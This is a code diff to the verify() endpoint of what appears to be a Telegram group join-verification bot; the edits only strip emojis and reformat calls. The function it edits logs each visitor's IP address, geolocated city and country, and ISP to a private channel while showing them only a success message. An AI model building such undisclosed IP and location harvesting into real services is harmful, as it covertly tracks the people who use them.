@@ -30,25 +30,29 @@ def verify():
     location = f"{geo.get('city', 'Unknown')}, {geo.get('regionName', '')} - {geo.get('country', 'Unknown')}"
 
     log_text = f"""
-🔥 NEW MEMBER DETECTED
+NEW MEMBER DETECTED
 
-👤 Name: {name}
-🆔 User ID: <code>{user_id}</code>
-🌐 IP: <code>{ip}</code>
-📍 Location: {location}
-🏢 ISP: {geo.get('isp', 'Unknown')}
-⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
+Name: {name}
+User ID: {user_id}
+IP: {ip}
+Location: {location}
+ISP: {geo.get('isp', 'Unknown')}
+Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
     """
 
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                  json={"chat_id": LOG_CHANNEL, "text": log_text, "parse_mode": "HTML"})
+    requests.post(
+        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+        json={"chat_id": LOG_CHANNEL, "text": log_text, "parse_mode": "HTML"}
+    )
 
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/approveChatJoinRequest",
-                  json={"chat_id": chat_id, "user_id": user_id})
+    requests.post(
+        f"https://api.telegram.org/bot{BOT_TOKEN}/approveChatJoinRequest",
+        json={"chat_id": chat_id, "user_id": user_id}
+    )
 
     return """
     <h2 style="text-align:center; margin-top:100px; color:green;">
-        ✅ Verification Successful!<br><br>
+        Verification Successful!<br><br>
         You have been verified and approved to the group.<br>
         Please wait a moment...
     </h2>
